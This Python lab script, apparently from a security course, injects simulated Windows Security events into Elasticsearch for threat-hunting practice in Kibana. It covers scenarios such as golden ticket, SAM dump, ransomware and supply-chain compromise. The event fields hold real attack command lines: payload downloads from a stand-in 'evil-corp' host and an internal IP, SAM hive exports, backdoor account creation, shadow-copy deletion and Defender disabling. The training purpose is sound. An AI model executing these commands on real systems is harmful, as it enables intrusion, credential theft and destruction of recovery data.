#!/usr/bin/env python3
"""
attack_simulator_winevt.py - Simulador de ataques Windows Event IDs en vivo
Inyecta eventos de seguridad Windows en Elasticsearch consultables desde Kibana.
Curso MAR404 - Clase 8 - Lab 16

Uso:
    simulate list              # Listar escenarios disponibles
    simulate <scenario>        # Ejecutar un escenario específico
    simulate all               # Ejecutar todos los escenarios
    simulate reset             # Limpiar eventos simulados
"""
import sys, json, time, random
from datetime import datetime, timedelta
from elasticsearch import Elasticsearch

ES_HOST = "http://elasticsearch:9200"
INDEX = "windows-security"

SCENARIOS = {
    "golden_ticket": {
        "name": "Golden Ticket Attack (T1558.001)",
        "description": "Forja de ticket Kerberos TGT con hash de krbtgt",
        "mitre": "T1558.001",
        "tactic": "Credential Access"
    },
    "dcom_lateral": {
        "name": "DCOM Lateral Movement (T1021.003)",
        "description": "Movimiento lateral via DCOM (MMC20.Application)",
        "mitre": "T1021.003",
        "tactic": "Lateral Movement"
    },
    "wmi_persistence": {
        "name": "WMI Event Subscription (T1546.003)",
        "description": "Persistencia fileless via suscripción WMI permanente",
        "mitre": "T1546.003",
        "tactic": "Persistence"
    },
    "sam_dump": {
        "name": "SAM Database Dump (T1003.002)",
        "description": "Extracción de hashes desde el registro SAM",
        "mitre": "T1003.002",
        "tactic": "Credential Access"
    },
    "dll_search_order": {
        "name": "DLL Search Order Hijacking (T1574.001)",
        "description": "Hijacking de orden de búsqueda de DLL en servicio legítimo",
        "mitre": "T1574.001",
        "tactic": "Persistence"
    },
    "token_impersonation": {
        "name": "Token Impersonation (T1134.001)",
        "description": "Impersonación de token SYSTEM desde servicio comprometido",
        "mitre": "T1134.001",
        "tactic": "Privilege Escalation"
    },
    "ransomware_execution": {
        "name": "Ransomware Full Chain (T1486)",
        "description": "Cadena completa: disable AV → delete shadows → encrypt → ransom note",
        "mitre": "T1486",
        "tactic": "Impact"
    },
    "supply_chain": {
        "name": "Supply Chain via Update (T1195.002)",
        "description": "Compromiso via actualización de software legítimo troyanizado",
        "mitre": "T1195.002",
        "tactic": "Initial Access"
    },
    "ad_enumeration": {
        "name": "Active Directory Enumeration (T1087.002)",
        "description": "Enumeración masiva de AD con BloodHound/SharpHound",
        "mitre": "T1087.002",
        "tactic": "Discovery"
    },
    "firewall_disable": {
        "name": "Firewall & Defender Disable (T1562.004)",
        "description": "Deshabilitación de firewall y Windows Defender",
        "mitre": "T1562.004",
        "tactic": "Defense Evasion"
    },
}


def get_es():
    return Elasticsearch(ES_HOST)


def now_iso():
    return datetime.utcnow().isoformat()


def inject_events(es, events):
    """Inyecta eventos en Elasticsearch."""
    for event in events:
        event["simulated"] = True
        event["simulated_at"] = now_iso()
        es.index(index=INDEX, document=event)
    es.indices.refresh(index=INDEX)
    return len(events)


def simulate_golden_ticket(es):
    """Simula Golden Ticket Attack."""
    base_time = datetime.utcnow()
    events = [
        {
            "event_id": 4769, "event_description": "A Kerberos service ticket was requested",
            "timestamp": base_time.isoformat(),
            "target_user": "CORP\\admin",
            "service_name": "krbtgt",
            "ticket_encryption": "0x17", "ticket_encryption_desc": "RC4-HMAC",
            "source_ip": "10.0.1.15",
            "hostname": "SRV-DC01",
            "category": "credential_access", "severity": "critical",
            "mitre_technique": "T1558.001", "mitre_tactic": "Credential Access",
            "attack_chain": "golden_ticket_sim",
            "hunt_note": "TGS request for krbtgt with RC4 - Golden Ticket indicator"
        },
        {
            "event_id": 4624, "event_description": "An account was successfully logged on",
            "timestamp": (base_time + timedelta(seconds=2)).isoformat(),
            "logon_type": 3, "logon_type_desc": "Network",
            "target_user": "CORP\\admin",
            "source_workstation": "WS-001",
            "source_ip": "10.0.1.15",
            "hostname": "SRV-DC01",
            "authentication_package": "Kerberos",
            "category": "lateral_movement", "severity": "critical",
            "mitre_technique": "T1558.001", "mitre_tactic": "Credential Access",
            "attack_chain": "golden_ticket_sim",
            "hunt_note": "Network logon with forged Kerberos ticket - no prior TGT request in logs"
        },
        {
            "event_id": 4672, "event_description": "Special privileges assigned to new logon",
            "timestamp": (base_time + timedelta(seconds=3)).isoformat(),
            "target_user": "CORP\\admin",
            "privileges": "SeDebugPrivilege, SeTakeOwnershipPrivilege, SeBackupPrivilege",
            "hostname": "SRV-DC01",
            "category": "privilege_escalation", "severity": "critical",
            "mitre_technique": "T1558.001", "mitre_tactic": "Credential Access",
            "attack_chain": "golden_ticket_sim",
            "hunt_note": "All privileges assigned - Golden Ticket grants full domain admin"
        },
    ]
    return inject_events(es, events)


def simulate_dcom_lateral(es):
    """Simula DCOM lateral movement."""
    base_time = datetime.utcnow()
    events = [
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": base_time.isoformat(),
            "new_process_name": r"C:\Windows\System32\mmc.exe",
            "command_line": r"C:\Windows\System32\mmc.exe -Embedding",
            "creator_process_name": r"C:\Windows\System32\svchost.exe",
            "target_user": "CORP\\admin",
            "hostname": "SRV-FILE01",
            "token_elevation_type": "%%1937",
            "category": "lateral_movement", "severity": "critical",
            "mitre_technique": "T1021.003", "mitre_tactic": "Lateral Movement",
            "attack_chain": "dcom_lateral_sim",
            "hunt_note": "MMC.exe spawned by svchost with -Embedding flag = DCOM activation"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=2)).isoformat(),
            "new_process_name": r"C:\Windows\System32\cmd.exe",
            "command_line": r'cmd.exe /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.0.1.15:8080/payload.ps1\')"',
            "creator_process_name": r"C:\Windows\System32\mmc.exe",
            "target_user": "CORP\\admin",
            "hostname": "SRV-FILE01",
            "category": "execution", "severity": "critical",
            "mitre_technique": "T1021.003", "mitre_tactic": "Lateral Movement",
            "attack_chain": "dcom_lateral_sim",
            "hunt_note": "cmd.exe spawned by MMC.exe (DCOM) - downloading payload"
        },
        {
            "event_id": 4624, "event_description": "An account was successfully logged on",
            "timestamp": (base_time - timedelta(seconds=1)).isoformat(),
            "logon_type": 3, "logon_type_desc": "Network",
            "target_user": "CORP\\admin",
            "source_workstation": "WS-001",
            "source_ip": "10.0.1.15",
            "hostname": "SRV-FILE01",
            "category": "lateral_movement", "severity": "high",
            "mitre_technique": "T1021.003", "mitre_tactic": "Lateral Movement",
            "attack_chain": "dcom_lateral_sim",
            "hunt_note": "Network logon preceding DCOM activation"
        },
    ]
    return inject_events(es, events)


def simulate_wmi_persistence(es):
    """Simula WMI Event Subscription persistence."""
    base_time = datetime.utcnow()
    events = [
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": base_time.isoformat(),
            "new_process_name": r"C:\Windows\System32\wbem\WMIC.exe",
            "command_line": r'wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="PersistFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-001",
            "token_elevation_type": "%%1937",
            "category": "persistence", "severity": "critical",
            "mitre_technique": "T1546.003", "mitre_tactic": "Persistence",
            "attack_chain": "wmi_persistence_sim",
            "hunt_note": "WMI EventFilter creation - triggers every 60 seconds"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=3)).isoformat(),
            "new_process_name": r"C:\Windows\System32\wbem\WMIC.exe",
            "command_line": r'wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="PersistConsumer", CommandLineTemplate="powershell.exe -nop -w hidden -enc aQBlAHgA..."',
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-001",
            "category": "persistence", "severity": "critical",
            "mitre_technique": "T1546.003", "mitre_tactic": "Persistence",
            "attack_chain": "wmi_persistence_sim",
            "hunt_note": "WMI Consumer creation - executes encoded PowerShell"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=6)).isoformat(),
            "new_process_name": r"C:\Windows\System32\wbem\WMIC.exe",
            "command_line": r'wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"PersistFilter\"", Consumer="CommandLineEventConsumer.Name=\"PersistConsumer\""',
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-001",
            "category": "persistence", "severity": "critical",
            "mitre_technique": "T1546.003", "mitre_tactic": "Persistence",
            "attack_chain": "wmi_persistence_sim",
            "hunt_note": "WMI Binding creation - links filter to consumer, persistence complete"
        },
    ]
    return inject_events(es, events)


def simulate_sam_dump(es):
    """Simula SAM database dump."""
    base_time = datetime.utcnow()
    events = [
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": base_time.isoformat(),
            "new_process_name": r"C:\Windows\System32\reg.exe",
            "command_line": r"reg.exe save HKLM\SAM C:\Windows\Temp\sam.save",
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-001",
            "token_elevation_type": "%%1937",
            "category": "credential_access", "severity": "critical",
            "mitre_technique": "T1003.002", "mitre_tactic": "Credential Access",
            "attack_chain": "sam_dump_sim",
            "hunt_note": "SAM hive exported - contains local account password hashes"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=2)).isoformat(),
            "new_process_name": r"C:\Windows\System32\reg.exe",
            "command_line": r"reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.save",
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-001",
            "token_elevation_type": "%%1937",
            "category": "credential_access", "severity": "critical",
            "mitre_technique": "T1003.002", "mitre_tactic": "Credential Access",
            "attack_chain": "sam_dump_sim",
            "hunt_note": "SYSTEM hive exported - needed to decrypt SAM hashes"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=4)).isoformat(),
            "new_process_name": r"C:\Windows\System32\reg.exe",
            "command_line": r"reg.exe save HKLM\SECURITY C:\Windows\Temp\security.save",
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-001",
            "token_elevation_type": "%%1937",
            "category": "credential_access", "severity": "critical",
            "mitre_technique": "T1003.002", "mitre_tactic": "Credential Access",
            "attack_chain": "sam_dump_sim",
            "hunt_note": "SECURITY hive exported - contains cached credentials and LSA secrets"
        },
    ]
    return inject_events(es, events)


def simulate_dll_search_order(es):
    """Simula DLL Search Order Hijacking."""
    base_time = datetime.utcnow()
    events = [
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": base_time.isoformat(),
            "new_process_name": r"C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe",
            "command_line": r"OfficeClickToRun.exe /service",
            "creator_process_name": r"C:\Windows\System32\services.exe",
            "target_user": "NT AUTHORITY\\SYSTEM",
            "hostname": "WS-001",
            "token_elevation_type": "%%1937",
            "category": "persistence", "severity": "high",
            "mitre_technique": "T1574.001", "mitre_tactic": "Persistence",
            "attack_chain": "dll_search_order_sim",
            "hunt_note": "Legitimate service starting - will load hijacked DLL"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=3)).isoformat(),
            "new_process_name": r"C:\Windows\System32\cmd.exe",
            "command_line": r"cmd.exe /c net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add",
            "creator_process_name": r"C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe",
            "target_user": "NT AUTHORITY\\SYSTEM",
            "hostname": "WS-001",
            "category": "persistence", "severity": "critical",
            "mitre_technique": "T1574.001", "mitre_tactic": "Persistence",
            "attack_chain": "dll_search_order_sim",
            "hunt_note": "cmd.exe spawned by OfficeClickToRun as SYSTEM - DLL hijack payload executing"
        },
        {
            "event_id": 4720, "event_description": "A user account was created",
            "timestamp": (base_time + timedelta(seconds=4)).isoformat(),
            "target_user": "WS-001\\backdoor",
            "subject_user": "NT AUTHORITY\\SYSTEM",
            "hostname": "WS-001",
            "category": "persistence", "severity": "critical",
            "mitre_technique": "T1136.001", "mitre_tactic": "Persistence",
            "attack_chain": "dll_search_order_sim",
            "hunt_note": "Backdoor account created by hijacked DLL"
        },
    ]
    return inject_events(es, events)


def simulate_token_impersonation(es):
    """Simula Token Impersonation."""
    base_time = datetime.utcnow()
    events = [
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": base_time.isoformat(),
            "new_process_name": r"C:\Windows\Temp\potato.exe",
            "command_line": r"potato.exe -t * -p C:\Windows\System32\cmd.exe -a '/c whoami'",
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "IIS APPPOOL\\DefaultAppPool",
            "hostname": "SRV-WEB01",
            "token_elevation_type": "%%1936",
            "category": "privilege_escalation", "severity": "critical",
            "mitre_technique": "T1134.001", "mitre_tactic": "Privilege Escalation",
            "attack_chain": "token_impersonation_sim",
            "hunt_note": "Potato exploit from IIS AppPool service account"
        },
        {
            "event_id": 4672, "event_description": "Special privileges assigned to new logon",
            "timestamp": (base_time + timedelta(seconds=2)).isoformat(),
            "target_user": "NT AUTHORITY\\SYSTEM",
            "privileges": "SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege",
            "hostname": "SRV-WEB01",
            "category": "privilege_escalation", "severity": "critical",
            "mitre_technique": "T1134.001", "mitre_tactic": "Privilege Escalation",
            "attack_chain": "token_impersonation_sim",
            "hunt_note": "SYSTEM token obtained via impersonation"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=3)).isoformat(),
            "new_process_name": r"C:\Windows\System32\cmd.exe",
            "command_line": r"cmd.exe /c whoami",
            "creator_process_name": r"C:\Windows\Temp\potato.exe",
            "target_user": "NT AUTHORITY\\SYSTEM",
            "hostname": "SRV-WEB01",
            "token_elevation_type": "%%1937",
            "category": "privilege_escalation", "severity": "critical",
            "mitre_technique": "T1134.001", "mitre_tactic": "Privilege Escalation",
            "attack_chain": "token_impersonation_sim",
            "hunt_note": "cmd.exe running as SYSTEM - privilege escalation successful"
        },
    ]
    return inject_events(es, events)


def simulate_ransomware_execution(es):
    """Simula cadena completa de ransomware."""
    base_time = datetime.utcnow()
    events = [
        # Step 1: Disable Defender
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": base_time.isoformat(),
            "new_process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": r'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true',
            "creator_process_name": r"C:\Users\admin\Desktop\invoice_final.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-002",
            "token_elevation_type": "%%1937",
            "category": "defense_evasion", "severity": "critical",
            "mitre_technique": "T1562.001", "mitre_tactic": "Defense Evasion",
            "attack_chain": "ransomware_sim",
            "hunt_note": "Step 1/5: Defender real-time monitoring disabled"
        },
        # Step 2: Delete shadow copies
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=5)).isoformat(),
            "new_process_name": r"C:\Windows\System32\vssadmin.exe",
            "command_line": "vssadmin.exe delete shadows /all /quiet",
            "creator_process_name": r"C:\Users\admin\Desktop\invoice_final.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-002",
            "category": "impact", "severity": "critical",
            "mitre_technique": "T1490", "mitre_tactic": "Impact",
            "attack_chain": "ransomware_sim",
            "hunt_note": "Step 2/5: Shadow copies deleted - no recovery possible"
        },
        # Step 3: Disable recovery
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=8)).isoformat(),
            "new_process_name": r"C:\Windows\System32\bcdedit.exe",
            "command_line": "bcdedit.exe /set {default} recoveryenabled No",
            "creator_process_name": r"C:\Users\admin\Desktop\invoice_final.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-002",
            "category": "impact", "severity": "critical",
            "mitre_technique": "T1490", "mitre_tactic": "Impact",
            "attack_chain": "ransomware_sim",
            "hunt_note": "Step 3/5: Boot recovery disabled"
        },
        # Step 4: Wevtutil clear logs
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=10)).isoformat(),
            "new_process_name": r"C:\Windows\System32\wevtutil.exe",
            "command_line": "wevtutil.exe cl Security",
            "creator_process_name": r"C:\Users\admin\Desktop\invoice_final.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-002",
            "category": "defense_evasion", "severity": "critical",
            "mitre_technique": "T1070.001", "mitre_tactic": "Defense Evasion",
            "attack_chain": "ransomware_sim",
            "hunt_note": "Step 4/5: Security log cleared - anti-forensics"
        },
        # Step 5: Ransom note
        {
            "event_id": 1102, "event_description": "The audit log was cleared",
            "timestamp": (base_time + timedelta(seconds=11)).isoformat(),
            "subject_user": "CORP\\admin",
            "hostname": "WS-002",
            "category": "defense_evasion", "severity": "critical",
            "mitre_technique": "T1070.001", "mitre_tactic": "Defense Evasion",
            "attack_chain": "ransomware_sim",
            "hunt_note": "Step 5/5: Audit log cleared event (this is the last event before encryption)"
        },
    ]
    return inject_events(es, events)


def simulate_supply_chain(es):
    """Simula Supply Chain Attack via software update."""
    base_time = datetime.utcnow()
    events = [
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": base_time.isoformat(),
            "new_process_name": r"C:\Program Files\TrustedVendor\Updater.exe",
            "command_line": r'"C:\Program Files\TrustedVendor\Updater.exe" /silent /update',
            "creator_process_name": r"C:\Windows\System32\services.exe",
            "target_user": "NT AUTHORITY\\SYSTEM",
            "hostname": "WS-003",
            "token_elevation_type": "%%1937",
            "category": "initial_access", "severity": "high",
            "mitre_technique": "T1195.002", "mitre_tactic": "Initial Access",
            "attack_chain": "supply_chain_sim",
            "hunt_note": "Legitimate updater service starting - trojanized version"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=5)).isoformat(),
            "new_process_name": r"C:\Windows\System32\cmd.exe",
            "command_line": r'cmd.exe /c certutil -urlcache -split -f http://cdn-update.evil-corp.net/stage2.bin C:\Windows\Temp\svchost.exe',
            "creator_process_name": r"C:\Program Files\TrustedVendor\Updater.exe",
            "target_user": "NT AUTHORITY\\SYSTEM",
            "hostname": "WS-003",
            "category": "execution", "severity": "critical",
            "mitre_technique": "T1195.002", "mitre_tactic": "Initial Access",
            "attack_chain": "supply_chain_sim",
            "hunt_note": "Trojanized updater downloading second stage via certutil"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=10)).isoformat(),
            "new_process_name": r"C:\Windows\Temp\svchost.exe",
            "command_line": r"C:\Windows\Temp\svchost.exe",
            "creator_process_name": r"C:\Program Files\TrustedVendor\Updater.exe",
            "target_user": "NT AUTHORITY\\SYSTEM",
            "hostname": "WS-003",
            "category": "execution", "severity": "critical",
            "mitre_technique": "T1036.005", "mitre_tactic": "Defense Evasion",
            "attack_chain": "supply_chain_sim",
            "hunt_note": "Fake svchost.exe from Temp - masquerading as legitimate process"
        },
    ]
    return inject_events(es, events)


def simulate_ad_enumeration(es):
    """Simula AD Enumeration con SharpHound."""
    base_time = datetime.utcnow()
    events = [
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": base_time.isoformat(),
            "new_process_name": r"C:\Users\user01\Downloads\SharpHound.exe",
            "command_line": r"SharpHound.exe --CollectionMethods All --Domain corp.local",
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\user01",
            "hostname": "WS-001",
            "token_elevation_type": "%%1936",
            "category": "discovery", "severity": "critical",
            "mitre_technique": "T1087.002", "mitre_tactic": "Discovery",
            "attack_chain": "ad_enumeration_sim",
            "hunt_note": "SharpHound/BloodHound collector - full AD enumeration"
        },
    ]
    # Multiple LDAP queries to DC
    for i in range(10):
        events.append({
            "event_id": 4662, "event_description": "An operation was performed on an object",
            "timestamp": (base_time + timedelta(seconds=i+1)).isoformat(),
            "subject_user": "CORP\\user01",
            "object_type": random.choice(["user", "group", "computer", "organizationalUnit"]),
            "access_mask": "0x10",
            "hostname": "SRV-DC01",
            "category": "discovery", "severity": "high",
            "mitre_technique": "T1087.002", "mitre_tactic": "Discovery",
            "attack_chain": "ad_enumeration_sim",
            "hunt_note": f"LDAP query #{i+1} - AD object enumeration"
        })
    return inject_events(es, events)


def simulate_firewall_disable(es):
    """Simula deshabilitación de firewall y Defender."""
    base_time = datetime.utcnow()
    events = [
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": base_time.isoformat(),
            "new_process_name": r"C:\Windows\System32\netsh.exe",
            "command_line": "netsh.exe advfirewall set allprofiles state off",
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-001",
            "token_elevation_type": "%%1937",
            "category": "defense_evasion", "severity": "critical",
            "mitre_technique": "T1562.004", "mitre_tactic": "Defense Evasion",
            "attack_chain": "firewall_disable_sim",
            "hunt_note": "Windows Firewall disabled on all profiles"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=2)).isoformat(),
            "new_process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": r'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true"',
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-001",
            "category": "defense_evasion", "severity": "critical",
            "mitre_technique": "T1562.001", "mitre_tactic": "Defense Evasion",
            "attack_chain": "firewall_disable_sim",
            "hunt_note": "Defender real-time and IOAV protection disabled"
        },
        {
            "event_id": 4688, "event_description": "A new process has been created",
            "timestamp": (base_time + timedelta(seconds=4)).isoformat(),
            "new_process_name": r"C:\Windows\System32\sc.exe",
            "command_line": "sc.exe config WinDefend start= disabled",
            "creator_process_name": r"C:\Windows\System32\cmd.exe",
            "target_user": "CORP\\admin",
            "hostname": "WS-001",
            "category": "defense_evasion", "severity": "critical",
            "mitre_technique": "T1562.001", "mitre_tactic": "Defense Evasion",
            "attack_chain": "firewall_disable_sim",
            "hunt_note": "Windows Defender service disabled permanently"
        },
    ]
    return inject_events(es, events)


def reset_simulated(es):
    """Elimina todos los eventos simulados."""
    body = {"query": {"term": {"simulated": True}}}
    result = es.delete_by_query(index=INDEX, body=body)
    es.indices.refresh(index=INDEX)
    return result.get("deleted", 0)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    command = sys.argv[1].lower()
    es = get_es()

    if command == "list":
        print("\n" + "="*70)
        print("  ESCENARIOS DE ATAQUE - Windows Security Events")
        print("="*70)
        for key, info in SCENARIOS.items():
            print(f"\n  {key}")
            print(f"    Nombre:      {info['name']}")
            print(f"    Descripción: {info['description']}")
            print(f"    MITRE:       {info['mitre']} ({info['tactic']})")
        print(f"\n{'='*70}")
        print(f"  Uso: simulate <scenario>  |  simulate all  |  simulate reset")
        print(f"{'='*70}\n")

    elif command == "all":
        print("\n[*] Ejecutando TODOS los escenarios de ataque...\n")
        total = 0
        for scenario in SCENARIOS:
            func = globals().get(f"simulate_{scenario}")
            if func:
                count = func(es)
                total += count
                print(f"  [+] {SCENARIOS[scenario]['name']}: {count} eventos")
        print(f"\n  [=] Total: {total} eventos inyectados en '{INDEX}'")
        print(f"  [=] Query Kibana: simulated:true")
        print(f"  [=] URL: http://localhost:5601/app/discover\n")

    elif command == "reset":
        deleted = reset_simulated(es)
        print(f"\n  [+] {deleted} eventos simulados eliminados de '{INDEX}'\n")

    elif command in SCENARIOS:
        func = globals().get(f"simulate_{command}")
        if func:
            count = func(es)
            info = SCENARIOS[command]
            print(f"\n  [+] {info['name']}")
            print(f"  [+] {count} eventos inyectados en '{INDEX}'")
            print(f"\n  Queries KQL sugeridas para Kibana:")
            print(f"  ─────────────────────────────────────────────────")
            print(f"  attack_chain:\"{command}_sim\"")
            print(f"  simulated:true AND severity:critical")
            print(f"  mitre_technique:\"{info['mitre']}\"")
            print(f"\n  URL Kibana: http://localhost:5601/app/discover\n")
    else:
        print(f"[-] Escenario '{command}' no reconocido. Use 'simulate list'.")


if __name__ == "__main__":
    main()
